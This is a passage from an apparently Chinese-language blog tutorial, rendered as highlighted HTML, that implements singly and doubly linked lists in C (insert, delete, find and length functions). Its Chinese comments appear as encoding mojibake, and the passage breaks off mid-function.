é™¤èŠ‚ç‚¹</span><br>Node* <span class="hljs-title function_">Delete</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (head-&gt;data == value) &#123; <span class="hljs-comment">// å¦‚æœè¦åˆ é™¤çš„æ˜¯å¤´èŠ‚ç‚¹</span><br>        Node *temp = head;<br>        head = head-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next-&gt;data != value) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p-&gt;next; <span class="hljs-comment">// æ‰¾åˆ°è¦åˆ é™¤çš„èŠ‚ç‚¹</span><br>        p-&gt;next = temp-&gt;next; <span class="hljs-comment">// é‡æ–°è¿æ¥é“¾è¡¨</span><br>        <span class="hljs-built_in">free</span>(temp);           <span class="hljs-comment">// é‡Šæ”¾èŠ‚ç‚¹å†…å­˜</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// æŒ‰åºå·åˆ é™¤èŠ‚ç‚¹</span><br>Node* <span class="hljs-title function_">DeleteAt</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ— æ•ˆçš„ç´¢å¼•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (index == <span class="hljs-number">0</span> &amp;&amp; head != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// åˆ é™¤å¤´èŠ‚ç‚¹</span><br>        Node *temp = head;<br>        head = head-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index - <span class="hljs-number">1</span>) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p-&gt;next; <span class="hljs-comment">// æ‰¾åˆ°è¦åˆ é™¤çš„èŠ‚ç‚¹</span><br>        p-&gt;next = temp-&gt;next; <span class="hljs-comment">// é‡æ–°è¿æ¥é“¾è¡¨</span><br>        <span class="hljs-built_in">free</span>(temp);           <span class="hljs-comment">// é‡Šæ”¾èŠ‚ç‚¹å†…å­˜</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç´¢å¼•è¶…å‡ºèŒƒå›´\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// æŒ‰å€¼æŸ¥æ‰¾èŠ‚ç‚¹</span><br>Node* <span class="hljs-title function_">FindByValue</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *p = head; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// æœªæ‰¾åˆ°åŒ¹é…çš„èŠ‚ç‚¹</span><br>&#125;<br><br><span class="hljs-comment">// æŒ‰åºå·æŸ¥æ‰¾èŠ‚ç‚¹</span><br>Node* <span class="hljs-title function_">FindByIndex</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p; <span class="hljs-comment">// å¦‚æœç´¢å¼•è¶…å‡ºèŒƒå›´ï¼Œå°†è¿”å› NULL</span><br>&#125;<br><br><span class="hljs-comment">// æ±‚é“¾è¡¨é•¿åº¦</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetLength</span><span class="hljs-params">(Node *head)</span> &#123;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        length++;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    Node *head = InitList(); <span class="hljs-comment">// åˆå§‹åŒ–æ²¡æœ‰å¤´èŠ‚ç‚¹çš„é“¾è¡¨</span><br>    <span class="hljs-comment">// æ’å…¥ä¸€äº›èŠ‚ç‚¹</span><br>    head = Insert(head, <span class="hljs-number">10</span>);<br>    head = Insert(head, <span class="hljs-number">20</span>);<br>    head = Insert(head, <span class="hljs-number">30</span>);<br>    head = Insert(head, <span class="hljs-number">40</span>);<br>    <span class="hljs-comment">// æ‰“å°é“¾è¡¨å†…å®¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// åœ¨å€¼ä¸º30çš„èŠ‚ç‚¹ä¹‹å‰æ’å…¥å€¼ä¸º25çš„èŠ‚ç‚¹</span><br>    head = InsertBefore(head, head-&gt;next-&gt;next, <span class="hljs-number">25</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åœ¨å€¼ä¸º30çš„èŠ‚ç‚¹ä¹‹å‰æ’å…¥å€¼ä¸º25çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// åœ¨å€¼ä¸º25çš„èŠ‚ç‚¹ä¹‹åæ’å…¥å€¼ä¸º27çš„èŠ‚ç‚¹</span><br>    InsertAfter(head-&gt;next-&gt;next, <span class="hljs-number">27</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åœ¨å€¼ä¸º25çš„èŠ‚ç‚¹ä¹‹åæ’å…¥å€¼ä¸º27çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// åˆ é™¤å€¼ä¸º20çš„èŠ‚ç‚¹</span><br>    head = Delete(head, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤å€¼ä¸º20çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// æŒ‰åºå·åˆ é™¤èŠ‚ç‚¹</span><br>    head = DeleteAt(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤ç´¢å¼•ä¸º2çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// æŒ‰å€¼æŸ¥æ‰¾èŠ‚ç‚¹</span><br>    Node *foundNode = FindByValue(head, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‰¾åˆ°å€¼ä¸º30çš„èŠ‚ç‚¹ï¼Œåœ°å€ä¸ºï¼š%p\n&quot;</span>, foundNode);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°å€¼ä¸º30çš„èŠ‚ç‚¹\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// æŒ‰åºå·æŸ¥æ‰¾èŠ‚ç‚¹</span><br>    foundNode = FindByIndex(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‰¾åˆ°ç´¢å¼•ä¸º1çš„èŠ‚ç‚¹ï¼Œå€¼ä¸ºï¼š%d\n&quot;</span>, foundNode-&gt;data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°ç´¢å¼•ä¸º1çš„èŠ‚ç‚¹\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// æ±‚é“¾è¡¨é•¿åº¦</span><br>    <span class="hljs-type">int</span> length = GetLength(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨é•¿åº¦ä¸ºï¼š%d\n&quot;</span>, length);<br>    <span class="hljs-comment">// é‡Šæ”¾é“¾è¡¨å†…å­˜</span><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨</strong></p><ul><li>åˆå§‹åŒ–æ—¶åˆ›å»ºä¸€ä¸ªå¤´èŠ‚ç‚¹ï¼Œå¤´èŠ‚ç‚¹ä¸å­˜å‚¨æœ‰æ•ˆæ•°æ®ã€‚</li><li>æ’å…¥ã€åˆ é™¤ã€éå†ç­‰æ“ä½œéƒ½ä»å¤´èŠ‚ç‚¹å¼€å§‹ï¼Œç®€åŒ–äº†å¯¹ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„ç‰¹æ®Šåˆ¤æ–­ã€‚</li><li>ä¾‹å¦‚åœ¨<code>Insert()</code>å’Œ<code>Delete()</code>å‡½æ•°ä¸­æ“ä½œæ—¶ï¼Œç”±äºæœ‰å¤´èŠ‚ç‚¹çš„å­˜åœ¨ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹éƒ½å¯ä»¥ç”¨ç»Ÿä¸€çš„æ–¹å¼æ¥å¤„ç†ã€‚</li></ul><p><strong>ä¸å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨</strong></p><ul><li>åˆå§‹åŒ–æ—¶ç›´æ¥è®¾ç½®ä¸ºç©ºé“¾è¡¨ï¼ˆ<code>NULL</code>ï¼‰ã€‚</li><li>æ’å…¥æ“ä½œæ—¶ï¼Œå¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œæ–°èŠ‚ç‚¹æˆä¸ºå¤´èŠ‚ç‚¹ã€‚</li><li>åˆ é™¤æ“ä½œéœ€è¦ç‰¹æ®Šå¤„ç†ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æƒ…å†µï¼Œä»¥ç¡®ä¿å¤´èŠ‚ç‚¹æ­£ç¡®è¿æ¥åç»­èŠ‚ç‚¹ã€‚</li></ul><h3 id="åŒé“¾è¡¨"><a href="#åŒé“¾è¡¨" class="headerlink" title="åŒé“¾è¡¨"></a>åŒé“¾è¡¨</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰åŒå‘é“¾è¡¨èŠ‚ç‚¹</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// å­˜å‚¨æ•°æ®</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *next;  <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *prev;  <span class="hljs-comment">// æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span><br>&#125; Node;<br><br><span class="hljs-comment">// åˆå§‹åŒ–åŒå‘é“¾è¡¨</span><br><span class="hljs-function">Node* <span class="hljs-title">InitList</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºç©ºé“¾è¡¨</span><br>&#125;<br><br><span class="hljs-comment">// åœ¨é“¾è¡¨æœ«å°¾æ’å…¥æ–°èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">Insert</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    newNode-&gt;prev = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// å¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œæ–°èŠ‚ç‚¹ä½œä¸ºå¤´èŠ‚ç‚¹</span><br>    &#125;<br><br>    Node *p = head; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p = p-&gt;next; <span class="hljs-comment">// æ‰¾åˆ°é“¾è¡¨çš„æœ«å°¾</span><br>    &#125;<br>    p-&gt;next = newNode; <span class="hljs-comment">// å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°é“¾è¡¨æœ«å°¾</span><br>    newNode-&gt;prev = p;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// åœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹å‰æ’å…¥æ–°èŠ‚ç‚¹ï¼ˆå‰æ’æ³•ï¼‰</span><br><span class="hljs-function">Node* <span class="hljs-title">InsertBefore</span><span class="hljs-params">(Node *head, Node *target, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç›®æ ‡èŠ‚ç‚¹ä¸ºç©ºï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    <span class="hljs-keyword">if</span> (head == target) &#123; <span class="hljs-comment">// å¦‚æœç›®æ ‡èŠ‚ç‚¹æ˜¯å¤´èŠ‚ç‚¹</span><br>        newNode-&gt;next = head;<br>        newNode-&gt;prev = <span class="hljs-literal">NULL</span>;<br>        head-&gt;prev = newNode;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// æ–°èŠ‚ç‚¹ä½œä¸ºæ–°çš„å¤´èŠ‚ç‚¹</span><br>    &#125;<br><br>    Node *p = target-&gt;prev;<br>    newNode-&gt;next = target;<br>    newNode-&gt;prev = p;<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;next = newNode;<br>    &#125;<br>    target-&gt;prev = newNode;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// åœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹åæ’å…¥æ–°èŠ‚ç‚¹ï¼ˆåæ’æ³•ï¼‰</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InsertAfter</span><span class="hljs-params">(Node *target, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç›®æ ‡èŠ‚ç‚¹ä¸ºç©ºï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = target-&gt;next;<br>    newNode-&gt;prev = target;<br><br>    <span class="hljs-keyword">if</span> (target-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        target-&gt;next-&gt;prev = newNode;<br>    &#125;<br>    target-&gt;next = newNode;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é“¾è¡¨</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintList</span><span class="hljs-params">(Node *head)</span> </span>&#123;<br>    Node *p = head; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// æŒ‰å€¼åˆ é™¤èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">Delete</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;data != value) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> head; <span class="hljs-comment">// æœªæ‰¾åˆ°èŠ‚ç‚¹</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;prev != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;prev-&gt;next = p-&gt;next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        head = p-&gt;next; <span class="hljs-comment">// å¦‚æœåˆ é™¤çš„æ˜¯å¤´èŠ‚ç‚¹</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;next-&gt;prev = p-&gt;prev;<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(p); <span class="hljs-comment">// é‡Šæ”¾èŠ‚ç‚¹å†…å­˜</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// æŒ‰åºå·åˆ é™¤èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">DeleteAt</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ— æ•ˆçš„ç´¢å¼•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç´¢å¼•è¶…å‡ºèŒƒå›´\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;prev != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;prev-&gt;next = p-&gt;next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        head = p-&gt;next; <span class="hljs-comment">// å¦‚æœåˆ é™¤çš„æ˜¯å¤´èŠ‚ç‚¹</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;next-&gt;prev = p-&gt;prev;<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(p); <span class="hljs-comment">// é‡Šæ”¾èŠ‚ç‚¹å†…å­˜</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// æŒ‰å€¼æŸ¥æ‰¾èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">FindByValue</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *p = head; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span 